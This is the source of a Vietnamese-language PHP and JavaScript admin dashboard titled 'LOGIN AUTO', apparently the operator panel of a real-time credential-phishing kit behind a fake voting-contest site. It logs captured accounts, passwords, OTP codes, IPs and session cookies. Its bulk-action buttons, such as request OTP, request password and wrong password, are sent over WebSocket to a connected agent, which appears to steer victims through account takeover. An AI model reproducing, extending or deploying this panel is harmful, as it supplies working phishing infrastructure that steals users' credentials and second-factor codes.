<?php
/* Admin Dashboard - Cyberpunk Style */
?>
<div class="py-6">
  <!-- Header -->
  <div class="bg-slate-900/70 border border-cyan-400/20 rounded-xl p-4 md:p-5 shadow-xl mb-6 relative overflow-hidden">
    <div class="absolute inset-0 pointer-events-none" style="background: radial-gradient(800px 300px at -10% -20%, rgba(34,211,238,.12), transparent), radial-gradient(800px 300px at 110% 120%, rgba(168,85,247,.12), transparent);"></div>
    <div class="relative flex items-center justify-between gap-4">
      <div class="flex items-center gap-3">
        <div class="flex items-center gap-1">
          <span class="inline-block w-3 h-3 rounded-full bg-red-500 shadow"></span>
          <span class="inline-block w-3 h-3 rounded-full bg-yellow-400 shadow"></span>
          <span class="inline-block w-3 h-3 rounded-full bg-green-500 shadow"></span>
        </div>
        <h2 class="text-xl md:text-2xl font-bold tracking-wide text-cyan-300">BẢNG ĐIỀU KHIỂN LOGIN AUTO</h2>
      </div>
      <div class="flex items-center gap-3 text-sm">
        <div id="agentIndicator" class="flex items-center gap-2 px-3 py-1.5 rounded-full bg-slate-800 border border-white/10 text-slate-300">
          <span id="agentIcon">📡</span>
          <span>Agent: <b id="agentStatus" class="text-yellow-300">Kiểm tra...</b></span>
        </div>
        <button id="setAdminKeyBtn" class="px-3 py-1.5 rounded bg-cyan-600 hover:bg-cyan-500 text-white border border-cyan-300/40">Đặt Admin Key</button>
      </div>
    </div>
  </div>

  <!-- Widgets grid -->
  <div class="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-4 mb-6">
    <!-- Quick Menu Grid -->
    <div class="md:col-span-2 xl:col-span-4 bg-slate-900/70 border border-white/10 rounded-lg p-4">
      <div class="flex items-center justify-between mb-2">
        <div class="font-semibold text-slate-200">Menu nhanh</div>
        <button id="setFeaturePassBtn" class="px-2 py-1 rounded bg-fuchsia-700/60 hover:bg-fuchsia-600 text-white border border-fuchsia-300/40 text-xs">Đặt Feature Password</button>
      </div>
      <div class="grid grid-cols-2 md:grid-cols-3 xl:grid-cols-6 gap-2 text-sm">
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-white/10 text-left" data-route="dashboard">
          🏠 Dashboard
          <div class="text-xs text-slate-400">Trang chủ tổng quan</div>
        </button>
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-white/10 text-left" data-route="automation">
          🤖 Tự động hóa Chrome
          <div class="text-xs text-slate-400">Core automation</div>
        </button>
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-white/10 text-left" data-route="users">
          👥 Quản lý Người dùng
          <div class="text-xs text-slate-400">User management</div>
        </button>
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-white/10 text-left" data-route="admins">
          👨‍💼 Quản lý Admin
          <div class="text-xs text-slate-400">Administrative</div>
        </button>
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-white/10 text-left" data-route="integrations">
          🔗 Tích hợp và API
          <div class="text-xs text-slate-400">Technical integration</div>
        </button>
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-white/10 text-left" data-route="tools">
          🛠️ Công cụ và Tiện ích
          <div class="text-xs text-slate-400">System tools</div>
        </button>
        <!-- Gộp chung -->
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-white/10 text-left" data-route="mobile">
          📱 Quản lý Mobile
          <div class="text-xs text-slate-400">Mobile experience</div>
        </button>
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-white/10 text-left" data-route="settings">
          ⚙️ Cài đặt chung
          <div class="text-xs text-slate-400">System configuration</div>
        </button>
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-white/10 text-left" data-route="security">
          🔒 Bảo mật và Giám sát
          <div class="text-xs text-slate-400">Security</div>
        </button>
        <!-- Khóa bằng Feature Password -->
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-fuchsia-400/30 text-left" data-route="notifications" data-locked="1">
          🔔 Quản lý Thông báo
          <div class="text-xs text-fuchsia-300">Communication • Yêu cầu mật khẩu</div>
        </button>
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-fuchsia-400/30 text-left" data-route="contests" data-locked="1">
          🏆 Quản lý Cuộc thi
          <div class="text-xs text-fuchsia-300">Core business • Yêu cầu mật khẩu</div>
        </button>
        <button class="px-3 py-2 rounded bg-slate-800/70 border border-fuchsia-400/30 text-left" data-route="content" data-locked="1">
          📝 Quản lý Nội dung
          <div class="text-xs text-fuchsia-300">Content creation • Yêu cầu mật khẩu</div>
        </button>
      </div>
    </div>
    <!-- Notifications Widget -->
    <div class="bg-slate-900/70 border border-white/10 rounded-lg p-4">
      <div class="flex items-center justify-between mb-2">
        <div class="font-semibold text-slate-200">Thông báo</div>
        <div class="text-xs text-slate-400">Realtime</div>
      </div>
      <ul id="notifList" class="space-y-2 text-sm max-h-48 overflow-auto pr-1">
        <li class="text-slate-400">Chưa có thông báo.</li>
      </ul>
    </div>
    <!-- Dynamic Status Widget -->
    <div class="bg-slate-900/70 border border-white/10 rounded-lg p-4">
      <div class="flex items-center justify-between mb-2">
        <div class="font-semibold text-slate-200">Trạng thái động</div>
        <div id="dynBadge" class="text-xs px-2 py-0.5 rounded bg-yellow-500/20 text-yellow-300 border border-yellow-400/30">Đang cập nhật</div>
      </div>
      <div class="text-sm text-slate-300 space-y-1">
        <div>Người dùng online: <span id="onlineUsers" class="font-mono">N/A</span></div>
        <div>WS Host: <span id="wsHost" class="font-mono"></span></div>
        <div>WS Port: <span id="wsPort" class="font-mono"></span></div>
        <div>Server time: <span id="serverTime" class="font-mono"></span></div>
      </div>
    </div>
    <!-- Stats Widget -->
    <div class="bg-slate-900/70 border border-white/10 rounded-lg p-4">
      <div class="font-semibold text-slate-200 mb-2">Thống kê</div>
      <div class="grid grid-cols-2 gap-3 text-sm mb-3">
        <div class="p-3 rounded bg-slate-800/70 border border-white/10">
          <div class="text-slate-400">Users</div>
          <div id="statUsers" class="text-lg font-bold text-cyan-300">0</div>
        </div>
        <div class="p-3 rounded bg-slate-800/70 border border-white/10">
          <div class="text-slate-400">Votes</div>
          <div id="statVotes" class="text-lg font-bold text-cyan-300">0</div>
        </div>
        <div class="p-3 rounded bg-slate-800/70 border border-white/10">
          <div class="text-slate-400">Contests</div>
          <div id="statContests" class="text-lg font-bold text-cyan-300">0</div>
        </div>
        <div class="p-3 rounded bg-slate-800/70 border border-white/10">
          <div class="text-slate-400">Contestants</div>
          <div id="statContestants" class="text-lg font-bold text-cyan-300">0</div>
        </div>
      </div>
      <div class="grid grid-cols-2 gap-3 text-sm">
        <div class="p-3 rounded bg-slate-800/70 border border-white/10">
          <div class="text-slate-400">Tổng Audit Logs</div>
          <div id="auditTotal" class="text-lg font-bold text-slate-200">0</div>
        </div>
        <div class="p-3 rounded bg-cyan-900/30 border border-cyan-400/30">
          <div class="text-cyan-300">ℹ️ Info</div>
          <div id="auditInfo" class="text-lg font-bold text-cyan-300">0</div>
        </div>
        <div class="p-3 rounded bg-yellow-900/30 border border-yellow-400/30">
          <div class="text-yellow-300">⚠️ Warn</div>
          <div id="auditWarn" class="text-lg font-bold text-yellow-300">0</div>
        </div>
        <div class="p-3 rounded bg-red-900/30 border border-red-400/30">
          <div class="text-red-300">❌ Error</div>
          <div id="auditError" class="text-lg font-bold text-red-300">0</div>
        </div>
      </div>
    </div>
    <!-- US Clock Widget -->
    <div class="bg-slate-900/70 border border-white/10 rounded-lg p-4 flex items-center justify-between">
      <div>
        <div class="font-semibold text-slate-200">US Clock (New York)</div>
        <div id="usClock" class="text-2xl font-mono text-lime-300"></div>
      </div>
      <div class="text-5xl">🕒</div>
    </div>
  </div>

  <!-- Controls row -->
  <div class="bg-slate-900/70 border border-cyan-400/20 rounded-lg p-4 mb-6">
    <div class="flex flex-wrap items-center gap-2 text-sm">
      <button class="px-3 py-1.5 rounded border border-cyan-400/50 text-cyan-300 hover:bg-cyan-500/10" onclick="openCreateLoginDialog()">📄 Tạo Cột Login</button>
      <button class="px-3 py-1.5 rounded border border-cyan-400/50 text-cyan-300 hover:bg-cyan-500/10" onclick="bulkAction('request_approve')">🛡️ Yêu cầu Phê duyệt</button>
      <button class="px-3 py-1.5 rounded border border-cyan-400/50 text-cyan-300 hover:bg-cyan-500/10" onclick="bulkAction('request_otp')">💬 Yêu cầu OTP</button>
      <button class="px-3 py-1.5 rounded border border-cyan-400/50 text-cyan-300 hover:bg-cyan-500/10" onclick="bulkAction('request_password')">🔒 Yêu cầu Mật khẩu</button>
      <button class="px-3 py-1.5 rounded border border-cyan-400/50 text-cyan-300 hover:bg-cyan-500/10" onclick="bulkAction('wrong_password')">⚠️ Yêu cầu Sai MK</button>
      <button class="px-3 py-1.5 rounded border border-cyan-400/50 text-cyan-300 hover:bg-cyan-500/10" onclick="toast('Tính năng này chưa được triển khai')">🌐 Chrome Chỉ Định</button>
      <button class="px-3 py-1.5 rounded border border-cyan-400/50 text-cyan-300 hover:bg-cyan-500/10" onclick="bulkAction('reset')">🔄 Reset</button>
      <button class="px-3 py-1.5 rounded border border-red-500/60 text-red-300 hover:bg-red-500/10" onclick="bulkDelete()">🗑️ Xóa mục chọn</button>
    </div>
  </div>

  <!-- Filters & Search -->
  <div class="flex flex-col md:flex-row gap-3 mb-3">
    <div class="flex-1">
      <div class="relative">
        <input id="q" type="text" placeholder="Tìm kiếm..." class="w-full bg-slate-900/70 border border-white/10 rounded pl-9 pr-3 py-2 text-sm" />
        <span class="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400">🔎</span>
      </div>
    </div>
    <div class="flex-1 grid grid-cols-2 md:grid-cols-5 gap-2">
      <select id="actionFilter" class="bg-slate-900/70 border border-white/10 rounded px-2 py-2 text-sm">
        <option value="">Tất cả</option>
        <option>🟡 Chờ phê duyệt</option>
        <option>✅ Đăng nhập thành công</option>
        <option>❌ Từ chối đăng nhập</option>
        <option>ℹ️ Yêu cầu OTP</option>
        <option>👁️ Xem Cuộc thi</option>
        <option>👁️ Xem Thí sinh</option>
        <option>📊 Xem BXH</option>
        <option>🗳️ Bỏ phiếu</option>
        <option>🌐 HTTP Request</option>
      </select>
      <select id="adminLinkFilter" class="bg-slate-900/70 border border-white/10 rounded px-2 py-2 text-sm">
        <option value="">Tất cả Admin Link</option>
      </select>
      <select id="levelFilter" class="bg-slate-900/70 border border-white/10 rounded px-2 py-2 text-sm">
        <option value="">Mức độ: Tất cả</option>
        <option value="info">ℹ️ Info</option>
        <option value="warn">⚠️ Warn</option>
        <option value="error">❌ Error</option>
      </select>
      <div class="col-span-2 md:col-span-2 flex items-center justify-end text-xs text-slate-400">Tự động reset về trang 1 khi lọc/tìm</div>
    </div>
  </div>

  <!-- History Table -->
  <div class="bg-slate-900/70 border border-white/10 rounded-lg overflow-hidden">
    <div class="overflow-x-auto">
      <table class="min-w-full text-sm">
        <thead class="bg-slate-800/70 text-slate-300">
          <tr>
            <th class="p-2"><input type="checkbox" id="chkAll" onclick="toggleAll(this)"></th>
            <th class="p-2 text-left">Thời gian</th>
            <th class="p-2 text-left">Hành động</th>
            <th class="p-2 text-left">Tên link</th>
            <th class="p-2 text-left">Tài khoản</th>
            <th class="p-2 text-left">Mật khẩu</th>
            <th class="p-2 text-left">OTP</th>
            <th class="p-2 text-left">IP</th>
            <th class="p-2 text-left">Trạng thái</th>
            <th class="p-2 text-left">Chrome</th>
            <th class="p-2 text-left">Nền tảng</th>
            <th class="p-2 text-left">Thiết bị</th>
            <th class="p-2 text-left">Admin Link</th>
            <th class="p-2 text-left">Cookie</th>
          </tr>
        </thead>
        <tbody id="historyBody" class="divide-y divide-white/5">
          <tr>
            <td class="p-2"><input type="checkbox"></td>
            <td class="p-2 text-slate-400" colspan="13">Chưa có dữ liệu. Tính năng log sẽ được bổ sung.</td>
          </tr>
        </tbody>
      </table>
    </div>
    <div class="flex items-center justify-between border-t border-white/10 p-2 text-xs text-slate-400">
      <div>Trang <span id="page">1</span> / <span id="pages">1</span></div>
      <div class="flex gap-2">
        <button class="px-2 py-1 bg-slate-800 rounded border border-white/10" onclick="prevPage()">Prev</button>
        <button class="px-2 py-1 bg-slate-800 rounded border border-white/10" onclick="nextPage()">Next</button>
      </div>
    </div>
  </div>
</div>

<script>
(function(){
  // Helpers
  function toast(msg, type){
    try { if (window.SpecialProgram) return window.SpecialProgram.showToast(msg, type||'info'); } catch(e){}
    alert(msg);
  }
  async function secureFetch(url, opts){
    const key = localStorage.getItem('ADMIN_KEY')||'';
    const fpass = localStorage.getItem('FEATURE_PASS')||'';
    const base = {'X-Admin-Key': key};
    if (fpass) base['X-Feature-Pass'] = fpass;
    const headers = Object.assign(base, (opts&&opts.headers)||{});
    return fetch(url, Object.assign({}, opts||{}, { headers }));
  }

  // Admin Key storage
  function getKey(){ return localStorage.getItem('ADMIN_KEY') || ''; }
  function setKey(k){ localStorage.setItem('ADMIN_KEY', k || ''); }
  const btn = document.getElementById('setAdminKeyBtn');
  btn.addEventListener('click', ()=>{
    const cur = getKey();
    const k = prompt('Nhập Admin Key', cur || '');
    if (k !== null) { setKey(k.trim()); toast('Đã lưu Admin Key', 'success'); fetchStatus(); }
  });

  // Feature Password storage
  function getFPass(){ return localStorage.getItem('FEATURE_PASS') || ''; }
  function setFPass(k){ localStorage.setItem('FEATURE_PASS', k || ''); }
  const fbtn = document.getElementById('setFeaturePassBtn');
  if (fbtn) {
    fbtn.addEventListener('click', ()=>{
      const cur = getFPass();
      const k = prompt('Đặt/nhập Feature Password (dùng cho các tính năng nhạy cảm)', cur || '');
      if (k !== null) { setFPass(k.trim()); toast('Đã lưu Feature Password', 'success'); }
    });
  }

  // System status polling
  async function fetchStatus(){
    try {
      const key = getKey();
      if (!key) { document.getElementById('agentStatus').textContent = 'Chưa cấu hình key'; setDynBadge('warn'); return; }
      const r = await secureFetch('/api/admin/system-status', { headers: { 'X-Admin-Key': key }});
      const j = await r.json();
      if (!j.ok) throw new Error(j.error||'error');
      const d = j.data || {};
      document.getElementById('agentStatus').textContent = d.agent_connected ? 'Đã kết nối' : 'Mất kết nối';
      document.getElementById('agentIndicator').className = 'flex items-center gap-2 px-3 py-1.5 rounded-full ' + (d.agent_connected?'bg-emerald-900/40 text-emerald-300 border border-emerald-400/30':'bg-red-900/30 text-red-300 border border-red-400/30');
      document.getElementById('agentIcon').textContent = d.agent_connected ? '📶' : '📴';
      document.getElementById('wsHost').textContent = d.ws_host || '';
      document.getElementById('wsPort').textContent = d.ws_port || '';
      document.getElementById('serverTime').textContent = d.server_time || '';
      const s = d.stats || {};
      setText('statUsers', s.users||0);
      setText('statVotes', s.votes||0);
      setText('statContests', s.contests||0);
      setText('statContestants', s.contestants||0);
      const al = d.audit_levels || {};
      setText('auditTotal', al.total||0);
      setText('auditInfo', al.info||0);
      setText('auditWarn', al.warn||0);
      setText('auditError', al.error||0);
      setDynBadge(d.agent_connected? 'ok':'error');
    } catch(e){ setDynBadge('error'); }
  }
  function setText(id, v){ const el=document.getElementById(id); if(el) el.textContent = v; }
  function setDynBadge(state){
    const el = document.getElementById('dynBadge'); if (!el) return;
    if (state==='ok') { el.textContent='Tốt'; el.className='text-xs px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-400/30'; }
    else if (state==='warn') { el.textContent='Cần key'; el.className='text-xs px-2 py-0.5 rounded bg-yellow-500/20 text-yellow-300 border border-yellow-400/30'; }
    else { el.textContent='Lỗi'; el.className='text-xs px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-400/30'; }
  }
  setInterval(fetchStatus, 4000);
  setTimeout(fetchStatus, 300);

  // US Clock (America/New_York)
  function updateUSClock(){
    const now = new Date();
    const options = { timeZone: 'America/New_York', hour12: true, hour:'2-digit', minute:'2-digit', second:'2-digit' };
    const s = now.toLocaleTimeString('en-US', options);
    document.getElementById('usClock').textContent = s;
  }
  setInterval(updateUSClock, 1000); updateUSClock();

  // Placeholders for actions & table
  window.openCreateLoginDialog = () => toast('Mở dialog tạo cột login (sắp có)');
  window.bulkAction = (t) => toast('Đã gửi hành động: '+t);
  window.bulkDelete = () => { if(confirm('Xóa vĩnh viễn các mục đã chọn?')) toast('Đã gửi yêu cầu xóa'); };
  window.toggleAll = (chk)=>{ document.querySelectorAll('#historyBody input[type=checkbox]').forEach(x=>x.checked=chk.checked); };
  window.prevPage = ()=> toast('Prev');
  window.nextPage = ()=> toast('Next');

  // Quick Menu handlers
  document.querySelectorAll('[data-route]').forEach(btn=>{
    btn.addEventListener('click', ()=>{
      const route = btn.getAttribute('data-route');
      const locked = btn.getAttribute('data-locked')==='1';
      if (locked) {
        let fp = getFPass();
        if (!fp) {
          const k = prompt('Nhập Feature Password để truy cập khu vực này');
          if (k===null || !k.trim()) { toast('Thiếu Feature Password', 'error'); return; }
          setFPass(k.trim()); fp = k.trim();
        }
      }
      // Điều hướng thực tế tới trang/route tương ứng
      const routeMap = {
        'dashboard': '/admin',
        'contests': '/admin/contests',
        'content': '/admin/content',
        'notifications': '/admin/notifications'
      };
      const target = routeMap[route];
      if (target) {
        window.location.href = target;
      } else {
        toast('Đi tới: '+route);
      }
    });
  });

  // History + filters + pagination
  const state = { page: 1, size: 10, q: '', action: '', admin_link: '', level: '' };
  const qInput = document.getElementById('q');
  const actionSel = document.getElementById('actionFilter');
  const adminLinkSel = document.getElementById('adminLinkFilter');
  const levelSel = document.getElementById('levelFilter');
  const tbody = document.getElementById('historyBody');
  const pageEl = document.getElementById('page');
  const pagesEl = document.getElementById('pages');

  function esc(s){ if(s===null||s===undefined) return ''; return (''+s).replace(/[&<>]/g, c=>({"&":"&amp;","<":"&lt;",">":"&gt;"}[c])); }
  function maskPassword(s){ if(!s) return ''; return '•'.repeat(Math.min(8, (''+s).length)); }

  async function loadHistory(){
    try{
      const u = new URL('/api/admin/history', location.origin);
      u.searchParams.set('page', state.page);
      u.searchParams.set('size', state.size);
      if (state.q) u.searchParams.set('q', state.q);
      if (state.action) u.searchParams.set('action', state.action);
      if (state.admin_link) u.searchParams.set('admin_link', state.admin_link);
      if (state.level) u.searchParams.set('level', state.level);
      const res = await secureFetch(u.toString());
      const j = await res.json();
      if(!j.ok) throw new Error('history_error');
      const d = j.data;
      pageEl.textContent = d.page; pagesEl.textContent = d.pages;
      if (!Array.isArray(d.items) || d.items.length===0){
        tbody.innerHTML = '<tr><td class="p-2"><input type="checkbox"></td><td class="p-2 text-slate-400" colspan="13">Không có dữ liệu.</td></tr>';
        return;
      }
      tbody.innerHTML = d.items.map(item=>{
        const acc = esc(item.account||'');
        const pwd = maskPassword(item.password);
        const otp = esc(item.otp||'N/A');
        const chrome = esc(item.chrome||'N/A');
        const platform = esc(item.platform||'');
        const device = esc(item.device||'Web');
        const al = item.admin_link||{};
        const adminLink = esc([al.label, al.admin, al.key].filter(Boolean).join(' · ')||'');
        const cookie = esc(item.cookie? 'Có' : 'Chờ...');
        const level = (item.level||'info');
        const levelBadge = level==='error' ? '<span class="px-2 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-400/30">❌ Error</span>'
                          : level==='warn' ? '<span class="px-2 py-0.5 rounded bg-yellow-500/20 text-yellow-300 border border-yellow-400/30">⚠️ Warn</span>'
                          : '<span class="px-2 py-0.5 rounded bg-cyan-500/20 text-cyan-300 border border-cyan-400/30">ℹ️ Info</span>';
        return `
          <tr>
            <td class="p-2"><input type="checkbox" data-id="${item.id}"></td>
            <td class="p-2 font-mono text-slate-300">${esc(item.created_at)}</td>
            <td class="p-2">${esc(item.action)}</td>
            <td class="p-2">${acc? 'User Login' : '—'}</td>
            <td class="p-2">${acc}</td>
            <td class="p-2">${pwd}</td>
            <td class="p-2">${otp}</td>
            <td class="p-2">${esc(item.ip||'')}</td>
            <td class="p-2">${levelBadge}</td>
            <td class="p-2">${chrome}</td>
            <td class="p-2">${platform}</td>
            <td class="p-2">${device}</td>
            <td class="p-2">${adminLink}</td>
            <td class="p-2">${cookie}</td>
          </tr>`;
      }).join('');
    }catch(e){ /* ignore */ }
  }

  const debounce = (fn, ms)=>{ let t; return (...a)=>{ clearTimeout(t); t=setTimeout(()=>fn(...a), ms); }; };
  qInput.addEventListener('input', debounce(()=>{ state.q = qInput.value.trim(); state.page=1; loadHistory(); }, 250));
  actionSel.addEventListener('change', ()=>{ state.action = actionSel.value; state.page=1; loadHistory(); });
  adminLinkSel.addEventListener('change', ()=>{ state.admin_link = adminLinkSel.value; state.page=1; loadHistory(); });
  levelSel.addEventListener('change', ()=>{ state.level = levelSel.value; state.page=1; loadHistory(); });
  window.prevPage = ()=>{ if(state.page>1){ state.page--; loadHistory(); } };
  window.nextPage = ()=>{ const total = parseInt(pagesEl.textContent||'1',10); if(state.page<total){ state.page++; loadHistory(); } };

  // WebSocket realtime
  let ws, wsUrl, wsTimer;
  function ensureWS(host, port){
    const url = `ws://${host}:${port}/ws`;
    if (wsUrl===url && ws && ws.readyState===1) return; // open
    wsUrl = url;
    try{ if (ws) { ws.close(); } }catch(e){}
    connectWS();
  }
  function connectWS(){
    if (!wsUrl) return;
    try{
      ws = new WebSocket(wsUrl);
      ws.onopen = ()=>{ /* connected */ };
      ws.onclose = ()=>{ wsTimer = setTimeout(connectWS, 1500); };
      ws.onerror = ()=>{ try{ ws.close(); }catch(e){} };
      ws.onmessage = (ev)=>{
        let msg; try{ msg = JSON.parse(ev.data); }catch(_){ return; }
        if (!msg || !msg.type) return;
        if (msg.type==='audit_log'){
          // Prepend notification
          const li = document.createElement('li');
          li.className='text-slate-300';
          li.textContent = (msg.title||msg.action||'Log') + ' • ' + (msg.time||'');
          const list = document.getElementById('notifList');
          if (list.firstElementChild && list.firstElementChild.textContent==='Chưa có thông báo.') list.innerHTML='';
          list.prepend(li);
          // Reload history softly
          loadHistory();
        } else if (msg.type==='status_update'){
          // could update dynamic badge/colors if needed
          setDynBadge('ok');
        } else if (msg.type==='connection_status'){
          document.getElementById('agentStatus').textContent = msg.connected? 'Đã kết nối':'Mất kết nối';
        }
      };
    }catch(e){ wsTimer = setTimeout(connectWS, 1500); }
  }

  // Initial load history
  loadHistory();

  // Tie WS host/port from system-status
  const _origFetchStatus = fetchStatus;
  fetchStatus = async function(){
    await _origFetchStatus();
    try{
      const key = getKey(); if (!key) return;
      const r = await secureFetch('/api/admin/system-status');
      const j = await r.json(); if (!j.ok) return;
      ensureWS(j.data.ws_host, j.data.ws_port);
    }catch(e){}
  }
})();
</script>
